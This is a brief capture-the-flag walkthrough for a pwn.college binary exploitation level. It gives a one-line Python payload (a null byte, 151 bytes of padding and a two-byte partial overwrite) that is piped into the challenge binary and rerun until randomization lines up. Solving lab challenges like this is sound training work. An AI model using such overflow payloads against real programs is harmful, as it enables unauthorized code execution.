# Stage 08: String Lengths (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-null-write` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-null-write`. Same null-write primitive at a larger offset: a leading `\x00` byte, 151 bytes of `A` padding, and the 2-byte tail `\xeb\x19`.

## Solution

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"\x00" + b"A"*151 + b"\xeb\x19")' | /challenge/binary-exploitation-null-write
```

Note from the original run: your values will likely be randomized. Run it as many times as you need to get the solution.
